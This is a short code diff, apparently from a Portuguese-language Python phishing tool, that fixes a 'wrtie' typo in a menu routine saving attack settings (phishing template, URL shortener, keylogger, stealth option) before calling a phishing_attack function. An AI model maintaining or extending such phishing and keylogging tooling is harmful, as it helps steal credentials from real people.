@@ -433,7 +433,7 @@ def menu_program(): #Menu do Programa
                   arquivo.write("\n" + url_action)
                   arquivo.write("\n" + encurtar_url)
                   arquivo.write("\n" + keylogger)
-                  arquivo.wrtie("\n" + furtive)
+                  arquivo.write("\n" + furtive)
                   arquivo.close()
                   phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger,furtive,horario)
                   break
